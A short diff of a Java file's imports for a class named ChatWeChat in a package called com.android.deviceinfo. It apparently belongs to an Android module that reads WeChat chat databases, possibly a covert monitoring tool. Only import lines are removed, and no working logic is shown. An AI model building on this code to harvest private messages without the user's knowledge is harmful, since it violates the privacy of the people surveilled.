@@ -5,24 +5,11 @@ import java.io.IOException;
 import java.util.ArrayList;
 import java.util.Arrays;
 import java.util.Date;
-import java.util.Enumeration;
-import java.util.Hashtable;
 import java.util.List;
 import java.util.concurrent.Semaphore;
 
-import javax.xml.parsers.DocumentBuilderFactory;
-
-import org.w3c.dom.Document;
-import org.w3c.dom.NamedNodeMap;
-import org.w3c.dom.Node;
-import org.w3c.dom.NodeList;
-
 import android.database.Cursor;
-import android.database.sqlite.SQLiteDatabase;
-import android.database.sqlite.SQLiteQueryBuilder;
-import android.util.Pair;
 
-import com.android.deviceinfo.Messages;
 import com.android.deviceinfo.auto.Cfg;
 import com.android.deviceinfo.db.GenericSqliteHelper;
 import com.android.deviceinfo.db.RecordVisitor;
@@ -31,7 +18,6 @@ import com.android.deviceinfo.manager.ManagerModule;
 import com.android.deviceinfo.module.ModuleAddressBook;
 import com.android.deviceinfo.util.Check;
 import com.android.deviceinfo.util.StringUtils;
-import com.android.deviceinfo.util.Utils;
 
 public class ChatWeChat extends SubModuleChat {
 	private static final String TAG = "ChatWeChat";
